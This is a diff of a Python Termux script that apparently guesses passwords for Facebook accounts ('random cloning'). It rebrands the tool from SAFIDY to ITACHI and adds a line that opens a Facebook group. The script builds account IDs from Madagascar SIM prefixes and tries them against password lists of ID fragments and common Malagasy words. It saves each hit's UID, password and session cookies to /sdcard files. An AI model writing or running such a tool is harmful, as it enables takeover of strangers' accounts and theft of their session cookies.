@@ -1,5 +1,6 @@
+
 # Définir le numéro de version
-version_actuelle = "2.0"
+version_actuelle = "1.5"
 
 
 
@@ -53,8 +54,6 @@ line_colors = [bblack, M, H, byellow, bblue, P, C, B]
 word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
 logo=(f'''{B}
-
-
                                  
 ,--.  ,--.,------.,--.,--.  ,--. 
 |  ,'.|  ||  .---'|  ||  ,'.|  | 
@@ -62,16 +61,14 @@ logo=(f'''{B}
 |  | `   ||  `---.|  ||  | `   | 
 `--'  `--'`------'`--'`--'  `--' 
                                  
-
                                             
-
 {warna}--------------------------------------------{B}
- Owner    : {M}SAFIDINIAINA{M}
- TOOL NAME : {warna}{P}SAFIDY{P}{warna}
- GROUPE-FB   : NONE
- STATUE : {H}PAID{H}
- Facebook : {bblue}SM{bblue}
- Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+ Owner    : {M}CHRICE999{M}
+ TOOL NAME : {warna}{P}NEIN{P}{warna}
+ GROUPE-FB   : [TERMUX-COMAND]
+ STATUE : {H}FREE{H}
+ Facebook : {bblue}ITACHI SQ{bblue}
+ Tools    : {warna}[{M}VERSION 1.5{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -83,6 +80,7 @@ def clear():
 #-------------main def------------#
 def MR_ITACHI():
     clear()
+    os.system('xdg-open https://facebook.com/groups/641144864016773/')
     print(f'{B} [{warna}01{B}] RANDOM CLONING ')
     print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
     linex()
@@ -95,7 +93,7 @@ def MR_ITACHI():
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
+    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
     print(' 261=0 Madagascar : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
@@ -116,9 +114,8 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids+psx,ids[:7],ids[:6],ids[5:],ids[4:],'narindra','Narindra','michel','Michel','sitraka','Sitraka','finoana','Finoana','valisoa','Valisoa','fitiavana','Fitiavana','milely','Milely','fandresena','Fandresena','Fiderana','fiderana','Nantenaina','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','fandresena','Fandresena','Nirina','nilaina','Nilaina','nirina']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
-            
     linex()
     print(' LE CLONING EST FINI ')
     print(' TOTAL OK ID '+str(len(oks)))
@@ -148,21 +145,21 @@ def method_crack(ids, passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
-                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
-                        os.makedirs("/sdcard/SAFIDY-IDS")
-                    # Enregistrer dans le fichier SAFIDY-OK.txt
-                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
+                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/ITACHI-IDS"):
+                        os.makedirs("/sdcard/ITACHI-IDS")
+                    # Enregistrer dans le fichier ITACHI-OK.txt
+                    with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier SAFIDY-CP.txt
-                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
+                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier ITACHI-CP.txt
+                with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
                     f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
